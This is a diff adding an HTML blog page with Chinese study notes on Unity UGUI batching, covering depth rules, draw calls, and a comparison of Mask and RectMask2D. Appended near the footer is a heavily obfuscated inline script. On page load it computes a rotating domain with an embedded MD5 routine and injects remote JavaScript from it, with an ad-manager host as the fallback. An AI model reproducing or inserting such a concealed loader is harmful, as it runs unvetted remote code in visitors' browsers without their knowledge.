@@ -1,0 +1,139 @@
+<!DOCTYPE html>
+<html class="no-js" lang="en">
+<head>
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<meta http-equiv="X-UA-Compatible" content="IE=edge">
+	<title>UGUI性能优化学习笔记（二）合批 - 编程小白</title>
+	<script>(function(d,e){d[e]=d[e].replace("no-js","js");})(document.documentElement,"className");</script>
+	<meta name="description" content="">
+	<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+	<link rel="dns-prefetch" href="//fonts.googleapis.com">
+	<link rel="dns-prefetch" href="//fonts.gstatic.com">
+	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400i,700">
+
+	<link rel="stylesheet" href="/css/style.css">
+	
+
+	<link rel="shortcut icon" href="/favicon.ico">
+		
+</head>
+<body class="body">
+	<div class="container container--outer">
+		<header class="header">
+	<div class="container header__container">
+		
+	<div class="logo">
+		<a class="logo__link" href="/" title="编程小白" rel="home">
+			<div class="logo__item logo__text">
+					<div class="logo__title">编程小白</div>
+					
+				</div>
+		</a>
+	</div>
+		<div class="divider"></div>
+	</div>
+</header>
+		<div class="wrapper flex">
+			<div class="primary">
+			
+<main class="main" role="main">
+	<article class="post">
+		<header class="post__header">
+			<h1 class="post__title">UGUI性能优化学习笔记（二）合批</h1>
+			
+		</header>
+		<div class="content post__content clearfix">
+			
+
+
+        
+                <div id="content_views" class="markdown_views prism-atom-one-light">
+                    
+                        
+                    
+                    <h1>
+<a id="_0"></a>一、合批规则</h1> 
+<p>合批：把渲染时使用相同材质、相同贴图的网格合并在一起，成为一个大网格，然后再调用一次Draw Call，直接渲染这一个大网格。这样做可以降低Draw Call的数量，以优化性能。</p> 
+<p>Unity是如何确定哪些网格可以进行合批的呢？</p> 
+<ul>
+<li>首先，合批是以Canvas为单位进行的。也就是说在不同Canvas下的UI元素是无法合批的。</li>
+<li>接下来需要计算Canvas下所有UI元素的深度值。深度值计算规则如下： 
+  <ul>
+<li>如果当前UI元素不进行渲染，则Depth = -1</li>
+<li>如果当前UI元素没有其他UI元素与其<strong>相交</strong>，则Depth = 0</li>
+<li>如果当前UI元素与其他UI元素相交，则判断它们能否进行合批（Material ID、Texture ID是否相等），如果满足合批的条件，则它们的Depth相同；如果不满足合批条件，则取下方UI的最大深度值，并在其基础上+1。</li>
+</ul> </li>
+<li>计算完深度值后，按照「深度值-&gt;Material ID-&gt;Texture ID-&gt;Renderer Order（Hierarchy面板上的顺序）」对UI元素进行排序，剔除深度值为-1的元素，形成一个队列。</li>
+<li>根据得到的队列，判断相邻元素之间的材质和贴图是否相同，只要相同就可以进行合批。注意这里不会对深度值进行判断，即使相邻元素深度值不同，只要满足上述条件也可以进行合批。</li>
+</ul> 
+<p>下面我们通过一个具体的示例加深理解<br> <img src="https://images2.imgbox.com/e5/43/jvUawZh3_o.png" alt=""></p> 
+<p>在上图中，白色Image位于所有UI元素的最底层，所以Depth = 0。接下来的文本位于白色Image的上层，所以Depth = 1。这里需要注意，UI元素进行深度判断是通过网格进行的，而不是通过rect。<br> <img src="https://images2.imgbox.com/31/d2/3BcSembE_o.png" alt=""></p> 
+<p>接下来对红色Image进行判断。因为下层的UI元素有白色的Image和Text两个，所以取它们之间深度值最大的那个。又因为Text和红色Image的材质与贴图都不相同，所以肯定无法进行合批。所以红色Image的Depth为Text的深度值+1，即Depth = 2。</p> 
+<p>再上层的黄色Image因为与下层的红色Image材质与贴图相同，可以进行合批，所以其深度值与红色Image的深度值相同，即Depth = 2。蓝色Image同理。</p> 
+<p>接下来就是按照前面的规则对UI元素进行排序，生成排序后的队列，并确定哪些元素可以合批。通过Profiler窗口，我们可以很方便地查看当前场景的合批情况。并且会列出打断合批的原因。<br> <img src="https://images2.imgbox.com/99/33/b8UeB7ah_o.png" alt=""></p> 
+<h1>
+<a id="_26"></a>二、遮罩组件</h1> 
+<h2>
+<a id="21_Mask_27"></a>2.1 Mask</h2> 
+<p>UGUI中的Mask组件有两个特点：</p> 
+<ul>
+<li>一个Mask组件除了绘制自身产生一次Draw Call外，还会额外产生两次Draw Call</li>
+<li>Mask会打断外部UI元素与内部UI元素的合批</li>
+</ul> 
+<h3>
+<a id="MaskDraw_Call_32"></a>Mask的额外两次Draw Call</h3> 
+<p>Mask在渲染之前，会遍历所有子元素并计算一次模板缓存。将需要绘制的部分的模板缓冲值设置为1，不需要绘制的部分设置为0。这步操作需要调用一次Draw Call。同时，在执行过程中，Mask会被设置一个特殊的材质。这也是导致其内部元素无法与外部元素合批的原因。<br> <img src="https://images2.imgbox.com/4c/82/0xP0N8b0_o.png" alt=""></p> 
+<p>绘制完成后，还需要将模板缓冲值恢复，这就又造成了一次Draw Call。</p> 
+<h3>
+<a id="Mask_38"></a>不同Mask间合批</h3> 
+<p>虽然Mask会导致外部的元素无法与内部的元素进行合批，但由于不同的Mask添加的特殊材质是相同的，所以不同的Mask之间可以进行合批。我们来看下面这个例子<br> <img src="https://images2.imgbox.com/d1/ab/CoVA33Ks_o.png" alt=""></p> 
+<p>当场景中存在一个Mask时，总的Batches数量为4。当我们再添加另一个Mask，可以发现Batches并没有发生变化<br> <img src="https://images2.imgbox.com/8e/59/gFt3Og6q_o.png" alt=""></p> 
+<h3>
+<a id="_45"></a>被剔除的元素仍会参与计算</h3> 
+<p>虽然被Mask遮挡的UI元素没有被绘制出来，但它仍然会参与合批的计算。我们尝试将一个Mask拖拽到另一个Mask剔除的UI元素区域。可以看到Batches增加到了7。这是因为被剔除的UI元素参与了合批计算，影响了深度值排序，从而导致无法进行合批。<br> <img src="https://images2.imgbox.com/7c/58/4Qnuof36_o.png" alt=""></p> 
+<h2>
+<a id="22_RectMask2D_49"></a>2.2 RectMask2D</h2> 
+<p>RectMask2D组件是基于自身Rect范围对下方的子元素进行裁剪实现的遮罩效果。这种实现方式有两个优点：</p> 
+<p>首先，RectMask2D本身不产生任何Draw Call。当场景中只有一个RectMask2D，且自身不挂载Image的情况下，场景中的Batches只有1（摄像机产生的Draw Call）<br> <img src="https://images2.imgbox.com/1a/92/GD391QOi_o.png" alt=""></p> 
+<p>其次，处于遮罩范围外的子元素会被直接裁剪，不会影响合批计算。我们拖动遮罩下的子元素，可以看到顶点数量和Batches的变化<br> <img src="https://images2.imgbox.com/da/38/XvJf0rbe_o.gif" alt=""></p> 
+<p>完全移出Mask范围的UI元素也不会参与合批计算<br> <img src="https://images2.imgbox.com/da/ee/IWfNipET_o.png" alt=""></p> 
+<h3>
+<a id="Mask_61"></a>不同Mask间无法合批</h3> 
+<p>RectMask2D也并不是完全没有缺点，它有个致命的问题是不同的Mask间无法进行合批。下图所示的情况，在Mask内部的UI元素材质、贴图完全相同的情况下仍然存在4次Draw Call。<br> <img src="https://images2.imgbox.com/c2/2b/DCBjQvSt_o.png" alt=""></p> 
+<p>将内部的UI元素隐藏，可以发现剩余两个Draw Call。这是因为RectMask2D本身挂载的Image是可以进行合批的。<br> <img src="https://images2.imgbox.com/22/e7/QHMPfKpS_o.png" alt=""></p> 
+<h2>
+<a id="23_MaskRectMask2D_68"></a>2.3 Mask还是RectMask2D？</h2> 
+<p>由此可见，Mask和RectMask2D各有优劣，并没有谁一定比谁的性能更优这一说，最重要的是要结合应用场景进行取舍。比如当一个场景中需要用到许多个遮罩，且内部的UI元素都是可以进行合批的，那么显然Mask要更适用。而如果一个场景中只需要一个遮罩，那么本身不占用Draw Call且不容易打断合批的RectMask2D要更适合些。</p> 
+<h1>
+<a id="_71"></a>三、参考资料</h1> 
+<p>[1]. https://www.laowangomg.com/?p=488<br> [2]. https://www.cnblogs.com/moran-amos/p/13878493.html<br> [3]. https://www.cnblogs.com/moran-amos/p/13883818.html<br> [4]. https://www.sikiedu.com/course/538</p>
+                </div>
+                
+                
+
+		</div>
+	</article>
+</main>
+
+
+
+
+			</div>
+			
+		</div>
+		<footer class="footer">
+	<div class="container footer__container flex">
+		
+		<div class="footer__copyright">
+			&copy; 2023 编程小白.
+			<span class="footer__copyright-credits">Generated with <a href="https://gohugo.io/" rel="nofollow noopener" target="_blank">Hugo</a> and <a href="https://github.com/Vimux/Mainroad/" rel="nofollow noopener" target="_blank">Mainroad</a> theme.</span>
+		</div>
+	</div>
+</footer>
+<script src="https://www.w3counter.com/tracker.js?id=150625"></script>
+<script data-cfasync='false'>function R(K,h){var O=X();return R=function(p,E){p=p-0x87;var Z=O[p];return Z;},R(K,h);}(function(K,h){var Xo=R,O=K();while(!![]){try{var p=parseInt(Xo(0xac))/0x1*(-parseInt(Xo(0x90))/0x2)+parseInt(Xo(0xa5))/0x3*(-parseInt(Xo(0x8d))/0x4)+parseInt(Xo(0xb5))/0x5*(-parseInt(Xo(0x93))/0x6)+parseInt(Xo(0x89))/0x7+-parseInt(Xo(0xa1))/0x8+parseInt(Xo(0xa7))/0x9*(parseInt(Xo(0xb2))/0xa)+parseInt(Xo(0x95))/0xb*(parseInt(Xo(0x9f))/0xc);if(p===h)break;else O['push'](O['shift']());}catch(E){O['push'](O['shift']());}}}(X,0x33565),(function(){var XG=R;function K(){var Xe=R,h=109325,O='a3klsam',p='a',E='db',Z=Xe(0xad),S=Xe(0xb6),o=Xe(0xb0),e='cs',D='k',c='pro',u='xy',Q='su',G=Xe(0x9a),j='se',C='cr',z='et',w='sta',Y='tic',g='adMa',V='nager',A=p+E+Z+S+o,s=p+E+Z+S+e,W=p+E+Z+D+'-'+c+u+'-'+Q+G+'-'+j+C+z,L='/'+w+Y+'/'+g+V+Xe(0x9c),T=A,t=s,I=W,N=null,r=null,n=new Date()[Xe(0x94)]()[Xe(0x8c)]('T')[0x0][Xe(0xa3)](/-/ig,'.')['substring'](0x2),q=function(F){var Xa=Xe,f=Xa(0xa4);function v(XK){var XD=Xa,Xh,XO='';for(Xh=0x0;Xh<=0x3;Xh++)XO+=f[XD(0x88)](XK>>Xh*0x8+0x4&0xf)+f[XD(0x88)](XK>>Xh*0x8&0xf);return XO;}function U(XK,Xh){var XO=(XK&0xffff)+(Xh&0xffff),Xp=(XK>>0x10)+(Xh>>0x10)+(XO>>0x10);return Xp<<0x10|XO&0xffff;}function m(XK,Xh){return XK<<Xh|XK>>>0x20-Xh;}function l(XK,Xh,XO,Xp,XE,XZ){return U(m(U(U(Xh,XK),U(Xp,XZ)),XE),XO);}function B(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&XO|~Xh&Xp,XK,Xh,XE,XZ,XS);}function y(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh&Xp|XO&~Xp,XK,Xh,XE,XZ,XS);}function H(XK,Xh,XO,Xp,XE,XZ,XS){return l(Xh^XO^Xp,XK,Xh,XE,XZ,XS);}function X0(XK,Xh,XO,Xp,XE,XZ,XS){return l(XO^(Xh|~Xp),XK,Xh,XE,XZ,XS);}function X1(XK){var Xc=Xa,Xh,XO=(XK[Xc(0x9b)]+0x8>>0x6)+0x1,Xp=new Array(XO*0x10);for(Xh=0x0;Xh<XO*0x10;Xh++)Xp[Xh]=0x0;for(Xh=0x0;Xh<XK[Xc(0x9b)];Xh++)Xp[Xh>>0x2]|=XK[Xc(0x8b)](Xh)<<Xh%0x4*0x8;return Xp[Xh>>0x2]|=0x80<<Xh%0x4*0x8,Xp[XO*0x10-0x2]=XK[Xc(0x9b)]*0x8,Xp;}var X2,X3=X1(F),X4=0x67452301,X5=-0x10325477,X6=-0x67452302,X7=0x10325476,X8,X9,XX,XR;for(X2=0x0;X2<X3[Xa(0x9b)];X2+=0x10){X8=X4,X9=X5,XX=X6,XR=X7,X4=B(X4,X5,X6,X7,X3[X2+0x0],0x7,-0x28955b88),X7=B(X7,X4,X5,X6,X3[X2+0x1],0xc,-0x173848aa),X6=B(X6,X7,X4,X5,X3[X2+0x2],0x11,0x242070db),X5=B(X5,X6,X7,X4,X3[X2+0x3],0x16,-0x3e423112),X4=B(X4,X5,X6,X7,X3[X2+0x4],0x7,-0xa83f051),X7=B(X7,X4,X5,X6,X3[X2+0x5],0xc,0x4787c62a),X6=B(X6,X7,X4,X5,X3[X2+0x6],0x11,-0x57cfb9ed),X5=B(X5,X6,X7,X4,X3[X2+0x7],0x16,-0x2b96aff),X4=B(X4,X5,X6,X7,X3[X2+0x8],0x7,0x698098d8),X7=B(X7,X4,X5,X6,X3[X2+0x9],0xc,-0x74bb0851),X6=B(X6,X7,X4,X5,X3[X2+0xa],0x11,-0xa44f),X5=B(X5,X6,X7,X4,X3[X2+0xb],0x16,-0x76a32842),X4=B(X4,X5,X6,X7,X3[X2+0xc],0x7,0x6b901122),X7=B(X7,X4,X5,X6,X3[X2+0xd],0xc,-0x2678e6d),X6=B(X6,X7,X4,X5,X3[X2+0xe],0x11,-0x5986bc72),X5=B(X5,X6,X7,X4,X3[X2+0xf],0x16,0x49b40821),X4=y(X4,X5,X6,X7,X3[X2+0x1],0x5,-0x9e1da9e),X7=y(X7,X4,X5,X6,X3[X2+0x6],0x9,-0x3fbf4cc0),X6=y(X6,X7,X4,X5,X3[X2+0xb],0xe,0x265e5a51),X5=y(X5,X6,X7,X4,X3[X2+0x0],0x14,-0x16493856),X4=y(X4,X5,X6,X7,X3[X2+0x5],0x5,-0x29d0efa3),X7=y(X7,X4,X5,X6,X3[X2+0xa],0x9,0x2441453),X6=y(X6,X7,X4,X5,X3[X2+0xf],0xe,-0x275e197f),X5=y(X5,X6,X7,X4,X3[X2+0x4],0x14,-0x182c0438),X4=y(X4,X5,X6,X7,X3[X2+0x9],0x5,0x21e1cde6),X7=y(X7,X4,X5,X6,X3[X2+0xe],0x9,-0x3cc8f82a),X6=y(X6,X7,X4,X5,X3[X2+0x3],0xe,-0xb2af279),X5=y(X5,X6,X7,X4,X3[X2+0x8],0x14,0x455a14ed),X4=y(X4,X5,X6,X7,X3[X2+0xd],0x5,-0x561c16fb),X7=y(X7,X4,X5,X6,X3[X2+0x2],0x9,-0x3105c08),X6=y(X6,X7,X4,X5,X3[X2+0x7],0xe,0x676f02d9),X5=y(X5,X6,X7,X4,X3[X2+0xc],0x14,-0x72d5b376),X4=H(X4,X5,X6,X7,X3[X2+0x5],0x4,-0x5c6be),X7=H(X7,X4,X5,X6,X3[X2+0x8],0xb,-0x788e097f),X6=H(X6,X7,X4,X5,X3[X2+0xb],0x10,0x6d9d6122),X5=H(X5,X6,X7,X4,X3[X2+0xe],0x17,-0x21ac7f4),X4=H(X4,X5,X6,X7,X3[X2+0x1],0x4,-0x5b4115bc),X7=H(X7,X4,X5,X6,X3[X2+0x4],0xb,0x4bdecfa9),X6=H(X6,X7,X4,X5,X3[X2+0x7],0x10,-0x944b4a0),X5=H(X5,X6,X7,X4,X3[X2+0xa],0x17,-0x41404390),X4=H(X4,X5,X6,X7,X3[X2+0xd],0x4,0x289b7ec6),X7=H(X7,X4,X5,X6,X3[X2+0x0],0xb,-0x155ed806),X6=H(X6,X7,X4,X5,X3[X2+0x3],0x10,-0x2b10cf7b),X5=H(X5,X6,X7,X4,X3[X2+0x6],0x17,0x4881d05),X4=H(X4,X5,X6,X7,X3[X2+0x9],0x4,-0x262b2fc7),X7=H(X7,X4,X5,X6,X3[X2+0xc],0xb,-0x1924661b),X6=H(X6,X7,X4,X5,X3[X2+0xf],0x10,0x1fa27cf8),X5=H(X5,X6,X7,X4,X3[X2+0x2],0x17,-0x3b53a99b),X4=X0(X4,X5,X6,X7,X3[X2+0x0],0x6,-0xbd6ddbc),X7=X0(X7,X4,X5,X6,X3[X2+0x7],0xa,0x432aff97),X6=X0(X6,X7,X4,X5,X3[X2+0xe],0xf,-0x546bdc59),X5=X0(X5,X6,X7,X4,X3[X2+0x5],0x15,-0x36c5fc7),X4=X0(X4,X5,X6,X7,X3[X2+0xc],0x6,0x655b59c3),X7=X0(X7,X4,X5,X6,X3[X2+0x3],0xa,-0x70f3336e),X6=X0(X6,X7,X4,X5,X3[X2+0xa],0xf,-0x100b83),X5=X0(X5,X6,X7,X4,X3[X2+0x1],0x15,-0x7a7ba22f),X4=X0(X4,X5,X6,X7,X3[X2+0x8],0x6,0x6fa87e4f),X7=X0(X7,X4,X5,X6,X3[X2+0xf],0xa,-0x1d31920),X6=X0(X6,X7,X4,X5,X3[X2+0x6],0xf,-0x5cfebcec),X5=X0(X5,X6,X7,X4,X3[X2+0xd],0x15,0x4e0811a1),X4=X0(X4,X5,X6,X7,X3[X2+0x4],0x6,-0x8ac817e),X7=X0(X7,X4,X5,X6,X3[X2+0xb],0xa,-0x42c50dcb),X6=X0(X6,X7,X4,X5,X3[X2+0x2],0xf,0x2ad7d2bb),X5=X0(X5,X6,X7,X4,X3[X2+0x9],0x15,-0x14792c6f),X4=U(X4,X8),X5=U(X5,X9),X6=U(X6,XX),X7=U(X7,XR);}return v(X4)+v(X5)+v(X6)+v(X7);},M=function(F){return r+'/'+q(n+':'+T+':'+F);},P=function(){var Xu=Xe;return r+'/'+q(n+':'+t+Xu(0xae));},J=document[Xe(0xa6)](Xe(0xaf));Xe(0xa8)in J?(L=L[Xe(0xa3)]('.js',Xe(0x9d)),J[Xe(0x91)]='module'):(L=L[Xe(0xa3)](Xe(0x9c),Xe(0xb4)),J[Xe(0xb3)]=!![]),N=q(n+':'+I+':domain')[Xe(0xa9)](0x0,0xa)+Xe(0x8a),r=Xe(0x92)+q(N+':'+I)[Xe(0xa9)](0x0,0xa)+'.'+N,J[Xe(0x96)]=M(L)+Xe(0x9c),J[Xe(0x87)]=function(){window[O]['ph'](M,P,N,n,q),window[O]['init'](h);},J[Xe(0xa2)]=function(){var XQ=Xe,F=document[XQ(0xa6)](XQ(0xaf));F['src']=XQ(0x98),F[XQ(0x99)](XQ(0xa0),h),F[XQ(0xb1)]='async',document[XQ(0x97)][XQ(0xab)](F);},document[Xe(0x97)][Xe(0xab)](J);}document['readyState']===XG(0xaa)||document[XG(0x9e)]===XG(0x8f)||document[XG(0x9e)]==='interactive'?K():window[XG(0xb7)](XG(0x8e),K);}()));function X(){var Xj=['addEventListener','onload','charAt','509117wxBMdt','.com','charCodeAt','split','988kZiivS','DOMContentLoaded','loaded','533092QTEErr','type','https://','6ebXQfY','toISOString','22mCPLjO','src','head','https://js.wpadmngr.com/static/adManager.js','setAttribute','per','length','.js','.m.js','readyState','2551668jffYEE','data-admpid','827096TNEEsf','onerror','replace','0123456789abcdef','909NkPXPt','createElement','2259297cinAzF','noModule','substring','complete','appendChild','1VjIbCB','loc',':tags','script','cks','async','10xNKiRu','defer','.l.js','469955xpTljk','ksu'];X=function(){return Xj;};return X();}</script>
+	</div>
+<script async defer src="/js/menu.js"></script>
+</body>
+</html>
